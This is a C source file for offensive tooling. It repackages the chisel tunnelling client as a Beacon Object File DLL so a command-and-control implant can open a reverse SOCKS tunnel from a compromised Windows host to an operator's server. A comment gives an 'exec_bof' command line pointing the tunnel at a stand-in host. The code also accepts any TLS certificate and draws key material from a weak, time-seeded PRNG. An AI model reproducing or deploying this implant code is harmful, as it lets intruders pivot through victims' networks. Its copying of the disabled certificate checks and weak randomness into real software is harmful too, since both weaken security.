/* bof/stock.c — stock jpillora/chisel client (v1.12.1, chisel-v3) as a bare BOF DLL.
 *
 * bare build:  -nostdlib, sole DLL export go @1 (tools/ext/stock.def);
 * console twin: -DTWIN_MAIN (stdio debug prints only).
 * command form: chisel client https://host[:port] R:socks [--port P] [--listen N]
 *               [--auth U:P] [--ver V] [--hv N]
 *               [--tgt A.B.C.D[:PORT]]  default destination for address-less connects
 *               [--keepalive D] [--ping-timeout D] [--connect-timeout D]
 *               [--ws-timeout D] [--ssh-timeout D]
 *               [--max-retry-count N] [--min-retry-interval D] [--max-retry-interval D]
 *               (D = chisel-style duration: 500ms / 30s / 5m / 1h; bare number = seconds)
 * tunnel layer: #include "sshtun.c" (see that file's contract).
 * TLS: mbedtls 3.6.7 in tools/MBED.a (arena calloc, PSA external RNG, mbedfmt snprintf).
 * crypto: tools/obj_crypto.o + tools/obj_x25519.o (winsock1 ordinals: tools/WS2_32.dll.a).
 * bare DNS: dotted-quad IPs only — ws2_32 ordinal table has no resolver import;
 *           SOCKS targets dialed by the client must also be IPs. */

#include <stdint.h>
#include <stddef.h>

#ifdef TWIN_MAIN
#include <stdio.h>
#define OUT(...) fprintf(stderr, __VA_ARGS__)
#elif defined(DIAG_MARK)
static void slogw(const char *f, ...);   /* ring logger, defined in sshtun.c */
#define OUT(...) slogw(__VA_ARGS__)
#else
#define OUT(...)
#endif

#include "mbedtls/ssl.h"
#include "mbedtls/error.h"
#include "mbedtls/debug.h"
#include "psa/crypto.h"

/* ---- winsock externs (ws2_32 ordinal imports) ---- */
extern int WSAStartup(int, void *);
extern int WSAGetLastError(void);
extern int socket(int, int, int);
extern int connect(int, void *, int);
extern int send(int, const char *, int, int);
extern int recv(int, char *, int, int);
extern int closesocket(int);
/* winsock's `ioctlsocket` command is an **encoded ioctl**, not the BSD small integer:
 *   FIONBIO  = _IOW('f',126,u_long) = 0x8004667E     (FIONREAD = 0x4004667F)
 * This file used to pass `0` there (assuming the BSD FIONBIO/FIONREAD pair), so every
 * ioctlsocket call failed with WSAEINVAL and the socket mode never changed anywhere in the
 * payload: the "dial non-blocking, then restore blocking" sequence was decorative - a blocking
 * connect() on a black-holed SYN really did stall the single thread - and the pump's
 * non-blocking behaviour came only from the MSG_DONTWAIT on the TLS write path.  Verified
 * against this toolchain's own <winsock2.h>. */
#define FIONBIO_ 0x8004667E
extern int ioctlsocket(int, int, unsigned long *);   /* FIONBIO's argument is passed BY POINTER */
static unsigned long nb_on = 1, nb_off = 0;          /* the only two values it ever takes */
extern int getsockopt(int, int, int, char *, int *);
/* Microsoft winsock2 setsockopt: (socket, level, optname, optval*, optlen).  SOL_SOCKET
 * is 0xffff; SO_RCVTIMEO/SO_SNDTIMEO are 0x1005/0x1006 and take a DWORD of milliseconds.
 * Declared here because we include no winsock headers - same reason as select() below. */
extern int setsockopt(int, int, int, const char *, int);
/* winsock select(): we never include <winsock2.h> (the payload binds ws2_32 by
 * ordinal and includes no CRT/SDK headers), so it must be declared here.  Every
 * call site passes our own fd_set1/tv1 structs with void* casts, which is exactly
 * the Microsoft x64 ABI shape (5 args, int return) - but until this line existed
 * the compiler only had an IMPLICIT declaration for it, which GCC >= 14 rejects
 * outright (-Werror=implicit-function-declaration) and which silently forbids the
 * compiler from checking the arguments. */
extern int select(int, void *, void *, void *, void *);

#define WSA_WOULD_BLOCK 10045   /* winsock EWOULDBLOCK, probed: recv(sd,b,n,flags!=0) -> r=-1 err=10045 */



/* ---- prng (fixed seed: the bare DLL has no NT-kernel entropy import) ---- */
static uint64_t rngs = 0x9E3779B97F4A7C15ull;
static uint64_t rnd(void);
/* reseed per TLS session: a constant stream makes every ECDHE ephemeral and
 * every WS mask key identical; the server's TLS 1.2 GCM then reuses a write
 * nonce across sessions (salt||seq) and Go's stack kills the connection. */
static void rng_reseed(void){
    extern unsigned long long GetTickCount64(void);
    rngs ^= GetTickCount64()*0x2545F4914F6CDD1Dull;
    { volatile char stackcanary; rngs ^= (unsigned long long)(size_t)&stackcanary*0x9E3779B97F4A7C15ull; }
    if(!rngs) rngs = 0x9E3779B97F4A7C15ull;
    rnd(); rnd(); rnd();
}
static uint64_t rnd(void){ rngs ^= rngs<<13; rngs ^= rngs>>7; rngs ^= rngs<<17; return rngs; }

static int rng_dummy(void *ctx, unsigned char *out, size_t len){
    (void)ctx; { size_t i; for(i=0;i<len;i++) out[i]=(unsigned char)rnd(); } return 0;
}

static void tldbg(void *ctx, int level, const char *file, int line, const char *msg){
    (void)ctx;
    OUT("mb[%d] %s:%d %s\n", level, file?file:"?", line, msg?msg:"?");
}

/* ---- mbedtls arena: first-fit free-list with neighbour coalescing ----
 *  A bump-only arena is wrong for a long-lived session: mbedTLS 3.6.7 allocates
 *  transient objects (PSA defensive record copies for EVERY TLS record) and
 *  frees them, so a bump allocator leaked ~16.7 KB/record and died with
 *  MBEDTLS_ERR_SSL_ALLOC_FAILED (-0x7F00) after ~300 connections (probed live).
 *  Block = 24-byte header {payload-size, next-free} + payload.  The header lives
 *  INSIDE the allocation: p[-16] = payload size, p[-8] = next-free, and the
 *  bitmap bit at (p-16)-arena marks the block LIVE.  A free is accepted only if
 *  that bit is set, so interior/alias pointers are never mistaken for owners
 *  (the old magic-scan design freed live blocks on stray pointers and corrupted
 *  the free list).  mbedTLS's bignum layer hands mbedtls_free an interior
 *  pointer (allocates slack, returns raw+ci); those frees are dropped (leaked)
 *  and the slack is bounded per call site.  Free list is address-ordered so a
 *  free coalesces with neighbours; calloc splits-and-reuses (64-byte classes). */
#define ARENA_N (20u<<20)
#define ARENA_HDR 24u
static size_t arena_off = 0;
static unsigned char arena[ARENA_N] = { 0xAA };   /* .data (file-backed): a beacon loader that commits only SizeOfRawData never maps a .bss arena */
static unsigned char *arena_fl = 0;               /* free-list head (address-ordered) */
static unsigned char arena_bm[ARENA_N/8u];       /* live-block bitmap: bit per 8-byte quantum at header starts */
static void bm_set(size_t o){ arena_bm[o>>3u] |= (unsigned char)(1u<<(o&7u)); }
static void bm_clr(size_t o){ arena_bm[o>>3u] &= (unsigned char)(~(1u<<(o&7u))); }
static int bm_get(size_t o){ return (int)((arena_bm[o>>3u]>>(o&7u))&1u); }
static size_t ld64(const unsigned char *p){ size_t v=0; size_t i; for(i=0u;i<8u;i++) v |= ((size_t)p[i])<<(i*8u); return v; }
static void st64(unsigned char *p, size_t v){ size_t i; for(i=0u;i<8u;i++) p[i]=(unsigned char)((v>>(i*8u))&0xFFu); }
static unsigned char *fl_next(unsigned char *f){
    size_t v = ld64(f+8u);
    if(!v) return 0;
    if(v < (size_t)(arena) || v >= (size_t)(arena + ARENA_N)) return 0;
    if(((size_t)(v - (size_t)(arena)) & 7u) != 0u) return 0;
    return (unsigned char*)v;
}
static void fl_add(unsigned char *blk, size_t sz){
    unsigned char *f = arena_fl, *pf = 0, *nf, **link = &arena_fl;
    size_t ps = 0;
    int absorbed = 0;
    if(!bm_get((size_t)(blk-arena))) return;   /* not live (double free / interior ptr): ignore */
    bm_clr((size_t)(blk-arena));               /* blk is now a free node */
    while(f && f<blk){ link=(unsigned char**)(f+8u); pf=f; f=fl_next(f); }
    while(f && f==(blk+ARENA_HDR+sz)){ sz += ARENA_HDR+ld64(f); nf=fl_next(f); *link=nf; f=nf; }
    if(pf && (pf+ARENA_HDR+ld64(pf))==blk){ ps = ARENA_HDR+ld64(pf); blk = pf; absorbed = 1; }
    st64(blk, sz+ps); st64(blk+8u, (size_t)f);
    if(!absorbed){ *link = blk; }
}
void *arena_calloc(size_t num, size_t size){
    unsigned char *f, *pred;
    size_t n;
    n = num * size;
    n = (n + 63u) & ~(size_t)63u;   /* 64-byte size classes: every fit remainder >= HDR, so freed blocks always split-and-reuse (no sliver loss) */
    if(!n) return 0;
    #ifdef DIAG_MARK
    { extern unsigned long long GetTickCount64(void); static unsigned ac=0; if(n>=2048u && (ac++&1023u)==0) slogw("ALLOC n=%u off=%u ra=%u u=%u",(unsigned)n,(unsigned)arena_off,(unsigned)(size_t)__builtin_return_address(0),(unsigned)GetTickCount64()); }
    #endif
    f = arena_fl; pred = 0;
    while(f){
        size_t fs = ld64(f);                /* payload bytes in this free node */
        if(fs >= n && (fs == n || fs - n >= (size_t)ARENA_HDR)){   /* skip nodes whose leftover is a header-sized sliver */
            size_t rest = fs - n;
            size_t fnext = ld64(f+8u);      /* old next, read BEFORE any header rewrite */
            if(rest >= (size_t)ARENA_HDR){
                unsigned char *nb = f + ARENA_HDR + n;
                st64(nb, rest-ARENA_HDR); st64(nb+8u, fnext);
                if(pred) st64(pred+8u, (size_t)nb); else arena_fl = nb;
            }
            else { if(pred) st64(pred+8u, fnext); else arena_fl = (unsigned char*)fnext; }   /* remainder too small: drop */
            st64(f, n);                 /* recorded size = allocation, not the old free extent: a freed reused block must never re-claim the split remainder (overlap -> list cycle) */
            bm_set((size_t)(f-arena));  /* reused node becomes live again */
            { unsigned char *p = f + ARENA_HDR; size_t i; for(i=0u;i<n;i++) p[i]=0; return (void*)p; }
        }
        pred = f;
        f = fl_next(f);
    }
    if(arena_off + ARENA_HDR + n > ARENA_N) return 0;
    { unsigned char *h = arena + arena_off;
      st64(h, n); st64(h+8u, 0u); bm_set(arena_off);
      arena_off += ARENA_HDR + n;
      { unsigned char *p = h + ARENA_HDR; size_t i; for(i=0u;i<n;i++) p[i]=0; return (void*)p; } }
}
void arena_free(void *p){
    unsigned char *h;
    size_t off, sz;
    if(!p) return;
    if((unsigned char*)p < arena + ARENA_HDR || (unsigned char*)p >= arena + ARENA_N) return;
    h = (unsigned char*)p - ARENA_HDR;
    off = (size_t)(h - arena);
    if((off & 7u) != 0u) return;
    if(!bm_get(off)) return;                       /* interior/stray pointer: drop */
    sz = ld64(h);
    if(sz > ARENA_N || off + ARENA_HDR + sz > ARENA_N) return;
    fl_add(h, sz);
}

/* ---- PSA external RNG ---- */
psa_status_t mbedtls_psa_external_get_random(
        mbedtls_psa_external_random_context_t *ctx,
        uint8_t *output, size_t output_size, size_t *output_length){
    #ifdef DIAG_MARK
    { extern unsigned long long GetTickCount64(void); if(output_size>=16u) slogw("RNG n=%u u=%u",(unsigned)output_size,(unsigned)GetTickCount64()); }
    #endif
    { size_t i; for(i=0;i<output_size;i++) output[i]=(uint8_t)rnd(); }
    *output_length = output_size;
    return PSA_SUCCESS;
}

/* ---- accept-all peer cert (we never verify the chisel self-signed cert) ---- */
static int accept_all(void *ssl, mbedtls_x509_crt *cert, int n, uint32_t *dbg){ (void)ssl;(void)cert;(void)n;(void)dbg; return 0; }

/* ---- BSD transport wrappers ---- */
static int tls_send(void *h, const unsigned char *buf, size_t n){
    #ifdef DIAG_MARK
    { static int tsent=0; extern unsigned long long GetTickCount64(void);
      if(tsent<6){ tsent++; slogw("TSEND n=%u u=%u",(unsigned)n,(unsigned)GetTickCount64()); } }
    #endif
    int r = send((int)(intptr_t)h, (const char*)buf, (int)n, 0x04 /*MSG_DONTWAIT*/);
    if(r < 0){
        int e = WSAGetLastError();
        if(e!=WSA_WOULD_BLOCK) OUT("tlssend: r=-1 wsa=%d n=%u\n", e, (unsigned)n);
        return (e==WSA_WOULD_BLOCK)?MBEDTLS_ERR_SSL_WANT_WRITE:-1;
    }
    return r;
}
static int tls_recv(void *h, unsigned char *buf, size_t n){
    int r = recv((int)(intptr_t)h, (char*)buf, (int)n, 0);
    if(r == 0){ OUT("tlsrecv: r=0 wsa=%d\n", WSAGetLastError()); return MBEDTLS_ERR_SSL_CONN_EOF; }
    if(r < 0){
        int e = WSAGetLastError();
        if(e!=WSA_WOULD_BLOCK) OUT("tlsrecv: r=-1 wsa=%d\n", e);
        return (e==WSA_WOULD_BLOCK)?MBEDTLS_ERR_SSL_WANT_READ:-1;
    }
    return r;
}
#ifndef FD_SET1_DEF
#define FD_SET1_DEF
typedef struct { unsigned int fd_count; unsigned long long fd_array[64]; } fd_set1;
typedef struct { long sec; long usec; } tv1;
#endif
/* ---- TLS-channel record IO for post-handshake WS bytes ---- */
extern int tls_fd;   /* underlying TLS socket, set by ss_run (defined in sshtun.c) */

/* Blocking write used ONLY during the handshake (no concurrent read needed).
   On WANT_WRITE (socket send buffer full) wait for writability, then retry;
   mbedtls_ssl_write resumes the partially-flushed record from its internal
   out_left, so re-passing b+off is correct. */
static int tls_write(mbedtls_ssl_context *c, const unsigned char *b, size_t n){
    size_t off=0;
    while(off<n){ int r=mbedtls_ssl_write(c,b+off,n-off);
                  if(r>0){ off+=(size_t)r; continue; }
                  if(r==MBEDTLS_ERR_SSL_WANT_WRITE){
                    if(tls_fd>=0){ fd_set1 ws; tv1 tv; ws.fd_count=1; ws.fd_array[0]=(unsigned long long)tls_fd; tv.sec=5; tv.usec=0; select(0,0,&ws,0,(void*)&tv); }
                    continue; }
                  if(r<=0){ OUT("tlswrite: r=%d off=%u need=%u wsa=%d\n", r, (unsigned)off, (unsigned)n, WSAGetLastError()); return -1; } }
    return 0;
}
int tls_buffered(void *v){ return mbedtls_ssl_get_bytes_avail((mbedtls_ssl_context*)v)>0?1:0; }
static int tls_read(mbedtls_ssl_context *c, unsigned char *b, size_t n){
    size_t off=0;
    while(off<n){ int r=mbedtls_ssl_read(c,b+off,n-off);
                  if(r>0){ off+=(size_t)r; continue; }
                  if(r!=MBEDTLS_ERR_SSL_WANT_READ){ OUT("tlsread: r=%d off=%u\n", r, (unsigned)off); return -1; }
    }
    return 0;
}
/* ---- single-frame OUTBOX: post-handshake sends are non-blocking so a full
   t=94 flush can NEVER block the pump away from select()/pk_recv.  A blocked
   blocking-send inside flush_pend was the 125s death: the pump never read the
   server's keepalive ping, never poned, the server timed out and closed.  The
   whole WS frame is buffered here; the pump drains it when tls_fd is writable,
   interleaving reads so control packets (pong) are never starved. ---- */
static int ws_nb=0;                 /* 1 = post-handshake outbox mode (see tls_push_nb) */
static unsigned char obuf[33000];   /* pending WS frame [obuf_off,obuf_n) */
static int obuf_n=0, obuf_off=0;
/* Deliberately NOT a FIONBIO flip: this payload's pump has always run on a blocking socket, and
   that is the tested contract.  Turning the server socket non-blocking for real truncates
   proxied streams (measured: 0/6 in tests/slowapp.py, streams ending after 0.4-2.2 MB with zero
   server-side errors) because tls_read maps a mid-record WSAEWOULDBLOCK to a transport error
   instead of "nothing yet".  Non-blocking behaviour where it is needed comes from MSG_DONTWAIT
   on the TLS write path (tls_send) plus the select()-gated reads and the single-frame outbox -
   not from the socket's mode. */
void ws_set_nb(void){ ws_nb=1; }
/* A new session means a new socket: the outbox belongs to the connection that just died, and
   the handshake phases must run in blocking mode (bounded by SO_RCVTIMEO/SNDTIMEO) until
   ws_set_nb().  Without this, `ws_nb` stayed 1 across sessions - so a redial's handshake writes
   took the outbox path - and a frame left half-flushed by the dead session made every following
   session's first ws_raw_put() return "refused" forever: an endless reconnect that never reached
   the pump. */
void ws_session_reset(void){ ws_nb=0; obuf_n=0; obuf_off=0; }
int ws_outbox_pending(void){ return obuf_off<obuf_n; }
/* push [off,n) of b through mbedtls without blocking; *done=bytes accepted.
   returns 0 complete, 1 would-block, -1 error. */
static int tls_push_nb(mbedtls_ssl_context *c, const unsigned char *b, size_t off, size_t n, size_t *done){
    size_t o=off;
    while(o<n){ int r=mbedtls_ssl_write(c,b+o,n-o);
                if(r>0){ o+=(size_t)r; continue; }
                if(r==MBEDTLS_ERR_SSL_WANT_WRITE){ *done=o; return 1; }
                OUT("tlswrite_nb: r=%d off=%u\n", r, (unsigned)o); return -1; }
    *done=o; return 0;
}
int ws_outbox_flush(void *v){
    if(obuf_off>=obuf_n) return 0;
    size_t done=0; int r=tls_push_nb((mbedtls_ssl_context*)v,obuf,(size_t)obuf_off,(size_t)obuf_n,&done);
    obuf_off=(int)done;
    if(r<0) return -1;
    return (obuf_off<obuf_n)?1:0;
}
/* ---- raw WS frames over the TLS channel (client frames masked) ---- */
static int ws_raw_put(mbedtls_ssl_context *c, const unsigned char *pl, int pn){
    /* One full WS frame (header+mask+payload) in a single buffer/write: the
       server's gorilla reader treats each ws_put as ONE frame, so the header
       and payload must never split across TLS records.  Cap must cover the
       largest pk_send wire: 4 + (1 + 1 + CH_MAX + 7) + 16 + 10 header/mask
       = 32814 for CH_MAX=32768 (a full 16 KB pend flush hits 16420 - the
       old 16400 cap returned -1 mid-stream and killed the session).

   Return contract - the shared tunnel code (tools/ext/sshtun.c) branches on it:
     0  the frame is fully on the wire.
     1  the frame is COMMITTED to the outbox: it was partially written and the
        remainder lives in obuf[] for ws_outbox_flush() to finish.  The caller
        MUST count those bytes as sent exactly once (window credit, queue
        shift) - they are not coming back.
     2  REFUSED: the outbox still holds the previous frame, so NOTHING of this
        frame went out; the caller must retry the very same bytes later.
    -1  transport error.
   Reading 1 as if it were 2 duplicated channel data and desynced the SSH
   channel window under sustained load; the server then killed the whole
   session with "ssh: remote side wrote too much" (TASKS.md 43.5). */
    unsigned char mask[4]; int n=0,i,ln=pn;
    if(pn+10 > 33000) return -1;
    if(ws_nb && obuf_off<obuf_n) return 2;   /* refused: outbox still holds the previous frame */
    obuf[n++]=0x82;
    if(ln<126) obuf[n++]=(unsigned char)(0x80|ln);
    else { obuf[n++]=0xFE; obuf[n++]=(unsigned char)(ln>>8); obuf[n++]=(unsigned char)ln; }
    for(i=0;i<4;i++) mask[i]=(unsigned char)rnd();
    for(i=0;i<4;i++) obuf[n+i]=mask[i]; n+=4;
    for(i=0;i<pn;i++) obuf[n+i]=pl[i]^mask[i&3];
    n+=pn;
    if(!ws_nb) return tls_write(c,obuf,(size_t)n) ? -1 : 0;
    { size_t done=0; int r=tls_push_nb(c,obuf,0,(size_t)n,&done);
      obuf_n=n; obuf_off=(int)done;
      if(r<0) return -1;
      return (obuf_off<obuf_n)?1:0; }   /* parked in the outbox = COMMITTED, not a failure */
}
static int ws_raw_get(mbedtls_ssl_context *c, unsigned char *pl, int *pn, int maxpl){
    unsigned char h[2], mask[4]; int len,masked,i,r;
    r=tls_read(c,h,2);
    if(r) return -1;
    masked=(h[1]&0x80)?1:0; len=h[1]&0x7F;
    if(len==126){ r=tls_read(c,h,2);
                  if(r) return -1;
                  len=(h[0]<<8)|h[1]; }
    else if(len==127) return -1;
    if(len>maxpl) return -1;
    if(masked){ r=tls_read(c,mask,4);
                if(r) return -1; }
    r=tls_read(c,pl,(size_t)len);
    if(r) return -1;
    if(masked){ for(i=0;i<len;i++) pl[i]^=mask[i&3]; }
    *pn=len; return 0;
}
static int cpstr(char *d, int off, const char *s){ int i=0; while(s[i]){ d[off+i]=s[i]; i++; } return i; }
static void itoa(char *d, int v){ char t[12]; int q=0,k=0; if(v<=0){ d[k++]='0'; d[k]=0; return; } while(v){ t[q++]=(char)('0'+v%10); v/=10; } while(q) d[k++]=t[--q]; d[k]=0; }

/* ---- KAT'd crypto from tools/obj_crypto.o ---- */
extern int b64_encode(const uint8_t *in, int n, char *out);
/* ---- findsub/pton for URL + response check ---- */
static const char *findsub(const char *h, const char *n){
    const char *p=h; int L=0; while(n[L]) L++;
    for(;; p++){ int i=0; while(i<L && *p+i && p[i]==n[i]) i++; if(i==L) return p; if(!*p) return 0; }
}
static int pton(const char *s, uint32_t *out){ /* dotted-quad -> struct byte order (b0 low) */
    uint32_t v[4]; int i; const char *p=s;
    for(i=0;i<4;i++){
        if(*p<'0'||*p>'9') return -1;
        v[i]=0;
        while(*p>='0'&&*p<='9'){ v[i]=v[i]*10u+(*p-'0'); if(v[i]>255u) return -1; p++; }
        if(i<3){ if(*p!='.') return -1; p++; }
    }
    if(*p) return -1;
    *out = v[0] | (v[1]<<8) | (v[2]<<16) | (v[3]<<24);
    return 0;
}
/* hostname targets: chisel dials names too.  winsock1 gethostbyname
 * (ws2_32 ordinal 51, added to WS2_32nat.def) after the dotted-quad
 * fast path.  AF_INET first answer only - same fidelity the stock Go
 * client gets from its net.Dial for the single-A cases tunnels use. */
struct hostent1 { char *h_name; char **h_aliases; short h_addrtype; short h_length; char **h_addr_list; };
extern struct hostent1 *gethostbyname(const char *name);
static int resolve(const char *host, uint32_t *out){
    if(!pton(host,out)) return 0;
    { struct hostent1 *h=gethostbyname(host);
      if(h && h->h_addrtype==2 && h->h_addr_list && h->h_addr_list[0]){ *out=*(uint32_t*)h->h_addr_list[0]; return 0; } }
    return -1;
}
/* Dial deadline for every socket this payload opens (the chisel server socket and
 * every proxied target).  Default 8 s = the value chosen when the pump was first made
 * single-threaded: a blocking connect() on a blackholed SYN stalls for the full Windows
 * SYN-retry timeout (~21 s), which starves the keepalive and the server then kills the
 * session after 5 missed pings (125 s).  Settable with --connect-timeout. */
static unsigned long long conntimeo = 8000;
static int sock_raw_connect(const char *host, int port, int mode){
    typedef struct { unsigned short family; unsigned short port_net; uint32_t addr_net; char zero[8]; } SOCKIN16;
    SOCKIN16 sa; { int i; for(i=0;i<8;i++) sa.zero[i]=0; }
    sa.family=2;
    if(resolve(host, &sa.addr_net)){ OUT("connect: resolve failed: %s\n", host); return -1; }
    sa.port_net=(unsigned short)((port>>8)|(port<<8));
    int sd=socket(2,0,mode);   /* 0 = SOCK_ANY (blocking), 4 = SOCK_NONBLOCKING */
    if(sd<0) return -1;
    if(mode==0){
        /* Bounded dial: dial non-blocking, wait for writable in 1 s slices up to
           conntimeo, confirm with SO_ERROR, then restore blocking
           (sock_send_all/sock_drain assume a blocking fd).  A blocking connect() on a
           blackholed SYN (rate-limited CDN) would otherwise stall the single-threaded
           pump for the full SYN-retry timeout (~21 s). */
        ioctlsocket(sd, FIONBIO_, &nb_on);   /* FIONBIO, by pointer */
        if(connect(sd,(void*)&sa,16)<0){
            int ok=0, i, slices;
            slices = (int)((conntimeo+999)/1000); if(slices<1) slices=1;
            for(i=0;i<slices;i++){
                struct { unsigned int n; unsigned long long f[1]; } ws;
                struct { long sec, usec; } tv;
                ws.n=1; ws.f[0]=(unsigned long long)sd; tv.sec=1; tv.usec=0;
                if(select(0,0,(void*)&ws,0,(void*)&tv)==1){ ok=1; break; }
            }
            if(!ok){ closesocket(sd); return -1; }
            { int err=-1, el=4;
              if(getsockopt(sd, 0xffff, 0x1007, (char*)&err, &el) || err!=0){ closesocket(sd); return -1; } }
        }
        ioctlsocket(sd, FIONBIO_, &nb_off);  /* really blocking again: the handshake deadlines need it,
                                                and sock_send_all/sock_drain assume a blocking fd */
        return sd;
    }
    if(connect(sd,(void*)&sa,16)<0){ closesocket(sd); return -1; }
    if(mode){ ioctlsocket(sd, FIONBIO_, &nb_on); }
    return sd;

}
/* UDP target socket for the R:<bind>:<dest>:udp remote (chisel handleUDP).
 *   winsock1 facts (proven 2026-10-11 on the wire): dest 0x10001 (SO_DGRAM)
 *   is rejected (WSAEOPNOTSUPP 10044); proto 4 (the TCP nonblocking form)
 *   NEVER leaves the host - send() loops back locally and recv() returns a
 *   20-byte winsock header + the sent bytes.  Real UDP = socket(2, SO_ANY,
 *   IPPROTO_UDP=17): clean datagrams both directions (responder hexdump
 *   proof).  Connected UDP, so the BSD send/recv shims carry whole
 *   datagrams. */
int sock_udp_dial(const char *host, int port){
    typedef struct { unsigned short family; unsigned short port_net; uint32_t addr_net; char zero[8]; } SOCKIN16U;
    SOCKIN16U sa; { int i; for(i=0;i<8;i++) sa.zero[i]=0; }
    sa.family=2;
    if(resolve(host, &sa.addr_net)) return -1;
    sa.port_net=(unsigned short)((port>>8)|(port<<8));
    { int sd=socket(2,0,17);
      if(sd<0) return -1;
      if(connect(sd,(void*)&sa,16)<0){ closesocket(sd); return -1; }
      return sd; }
}

/* ---- wrappers matching sshtun.c hook prototypes ---- */
int ws_put(void *c, const unsigned char *pl, int pn){ return ws_raw_put((mbedtls_ssl_context*)c,pl,pn); }
int ws_get(void *c, unsigned char *pl, int *pn, int maxpl){ return ws_raw_get((mbedtls_ssl_context*)c,pl,pn,maxpl); }
/* The chisel server socket AND every proxied target socket end up BLOCKING: the handshake phases
 * need SO_RCVTIMEO/SO_SNDTIMEO (ignored on a non-blocking socket), and the pump is built and
 * proven on blocking sockets - see the note above ws_set_nb().  Only the dial itself runs
 * non-blocking, inside sock_raw_connect, so --connect-timeout is a real bound; it is restored to
 * blocking before the fd is handed back. */
int sock_connect(const char *host, int port){ return sock_raw_connect(host,port,0); }
static int num(const char *s){ int v=0; while(*s>='0'&&*s<='9'){ v=v*10+(*s-'0'); s++; } return v; }
static int inum(const char *s){ int neg=0,v=0; if(*s=='-'){ neg=1; s++; } else if(*s=='+') s++;
    while(*s>='0'&&*s<='9'){ v=v*10+(*s-'0'); s++; } return neg?-v:v; }
/* monotonic milliseconds: GetTickCount64 is the only KERNEL32 import this image has, and it
 * is what the RNG reseeds from; every timeout in this file is measured against it. */
static unsigned long long now_ms(void){ extern unsigned long long GetTickCount64(void); return GetTickCount64(); }
/* Exact match of an argument against a flag name, ignoring LEADING DASHES: "--auth",
   "-auth" and "auth" are the same flag.  Not cosmetic - OST's `exec_bof <types><args>`
   is argparse-style, so any token beginning with a dash is consumed by its own option
   parser and can never become a packed record ("unrecognized arguments: --auth").  The
   dash-free spelling is therefore the only form that reaches this payload from OST:
     exec_bof zzzz auth ops:pass https://chisel.example.com R:1080:socks
   The rest of the name must still match exactly, so "authx" is not "auth", and values
   are unaffected (a flag's own argument is consumed by name, so "-1" for
   --max-retry-count is never tested here). */
static int flagis(const char *k, const char *f){ while(*k=='-') k++; while(*f=='-') f++; int i=0; for(;;){ if(k[i]!=f[i]) return 0; if(!k[i]) return 1; i++; } }

/* ---- chisel-style durations ---- */
/* "<int>[ms|s|m|h]" -> milliseconds.  Go's time.ParseDuration needs a unit and allows
 * fractions and ns/us; chisel's flags are parsed with it, so "25s"/"5m"/"1500ms" are the
 * forms that appear in chisel command lines.  A bare number is accepted here as seconds
 * (a convenience for BOF one-liners; chisel itself would reject "60").
 * Returns 0 on success, non-zero on anything unparseable or absurd (>30 days). */
static int parseds(const char *s, unsigned long long *out){
    unsigned long long v=0; int digits=0;
    while(*s==' '||*s=='\t') s++;
    while(*s>='0'&&*s<='9'){ v=v*10+(unsigned long long)(*s-'0'); digits=1; s++; }
    if(!digits) return 1;
    { unsigned long long mult;
      if(!*s) mult=1000ULL;
      else if(s[0]=='m'&&s[1]=='s'&&!s[2]) mult=1ULL;
      else if(s[0]=='s'&&!s[1]) mult=1000ULL;
      else if(s[0]=='m'&&!s[1]) mult=60000ULL;
      else if(s[0]=='h'&&!s[1]) mult=3600000ULL;
      else return 1;
      if(v > 2592000ULL) return 1;          /* > 30 days of seconds: a typo, not a setting */
      *out = v*mult; }
    return 0;
}

/* ---- per-phase socket timeouts (SO_RCVTIMEO / SO_SNDTIMEO) ---- */
/* The TLS handshake, the WebSocket upgrade read and the SSH handshake/auth/config are all
 * blocking on one thread.  Without a bound, a front-end that accepts the TCP connection and
 * then black-holes it (backend down, idle-dropped session, half-open after sleep/wake) hangs
 * the payload indefinitely: no data, no RST, no select() to notice.  A receive timeout turns
 * that into a failed read -> a failed phase -> the retry loop.  The pump resets both to 0
 * (ss_run does it after the handshake), because there the pump drives reads from select(). */
static void sock_timeo(int sd, unsigned long long ms){
    unsigned long dw = (ms>4294967295ULL) ? 0xFFFFFFFFUL : (unsigned long)ms;
    setsockopt(sd, 0xffff, 0x1005, (char*)&dw, 4);   /* SO_RCVTIMEO */
    setsockopt(sd, 0xffff, 0x1006, (char*)&dw, 4);   /* SO_SNDTIMEO */
}

/* ---- retry backoff (mirrors the chisel client) ---- */
/* chisel's connectionLoop uses jpillora/backoff v1.0.0 with Jitter=true, Factor=2:
 *   wait(attempt n) = uniform(min, min*2^n), clamped into [min, max]
 * and it resets the attempt counter when a connection stayed up for more than 5 s
 * (client_connect.go: `connected = time.Since(t0) > 5*time.Second`).  Defaults are
 * chisel's: min 1s, max 5m, no attempt limit. */
static int attempts = 0;
static int max_rc = -1;
static unsigned long long min_ri = 1000, max_ri = 300000;
static unsigned long long backoff_ms(int n){
    unsigned long long base = min_ri;
    int i;
    if(min_ri >= max_ri) return max_ri;
    for(i=0; i<n && base<max_ri; i++) base = (base > max_ri/2) ? max_ri : base*2;
    if(base > max_ri) base = max_ri;
    if(base <= min_ri) return min_ri;
    return min_ri + (unsigned long long)(rnd() % (unsigned long long)(base - min_ri + 1));
}
static void sleep_ms(unsigned long long ms){
    /* select() sleep in <=2 s slices: a beacon thread parked in one long select is
       indistinguishable from a wedged one, and the beacon polls this thread. */
    while(ms){ tv1 bs; unsigned long long chunk = (ms>2000)?2000:ms;
      bs.sec=(long)(chunk/1000); bs.usec=(long)((chunk%1000)*1000);
      select(0,0,0,0,&bs); ms-=chunk; }
}
/* 0 = caller should redial (already waited), 1 = budget exhausted, stop.
 * chisel counts the connection attempt that just failed before deciding
 * (client/client_connect.go: `attempt := int(b.Attempt()); if maxAttempt >= 0 &&
 * attempt >= maxAttempt { give up }`), so --max-retry-count 1 allows exactly ONE attempt,
 * and a negative value (chisel's default) is unlimited. The backoff index is 0-based, like
 * jpillora/backoff's Attempt(). */
static int retry_gate(const char *why){
    attempts++;
    if(max_rc>=0 && attempts>=max_rc){ OUT("give up after %d failed attempts (last: %s)\n", attempts, why); return 1; }
    { unsigned long long w = backoff_ms(attempts-1);
      char lim[24];
      if(max_rc>=0) lim[0]=0, itoa(lim, max_rc);
      else { const char *u="unlimited"; int i; for(i=0;u[i];i++) lim[i]=u[i]; lim[i]=0; }
      /* %u with a cast, not %llu: MinGW's default (non-ANSI) stdio does not understand
         %llu, and every duration here is capped at 30 days of milliseconds, which fits
         unsigned 32-bit.  slogw() (the DIAG ring) understands only %d/%u/%s too. */
      OUT("retry: %s (attempt %d/%s) waiting %u ms\n", why, attempts, lim, (unsigned)w);
      sleep_ms(w); }
    return 0;
}

/* ---- shared tunnel module (console twin of tools/ext/tlsprobe.c) ---- */
#include "sshtun.c"

